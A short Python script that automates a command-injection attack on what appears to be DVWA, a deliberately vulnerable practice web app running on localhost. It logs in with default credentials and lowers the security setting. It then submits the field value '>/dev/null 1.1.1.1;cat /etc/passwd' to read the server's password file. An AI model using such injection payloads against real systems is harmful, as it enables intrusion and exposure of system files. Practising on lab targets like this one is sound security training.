import mechanicalsoup

browser = mechanicalsoup.StatefulBrowser()

browser.open("http://localhost:8081/login.php")



browser.select_form('form[action="login.php"]')
browser["username"] = "admin"
browser["password"] = "password"

browser.submit_selected()


browser.follow_link("security.php")

browser.select_form('form[action="#"]')
browser["security"] = "low"
browser.submit_selected()

browser.follow_link("vulnerabilities/exec/")

browser.select_form('form[action="#"]')
browser["ip"] = ">/dev/null 1.1.1.1;cat /etc/passwd"
response = browser.submit_selected()

messages = response.soup.find("pre")
if messages:
    print(messages.text)
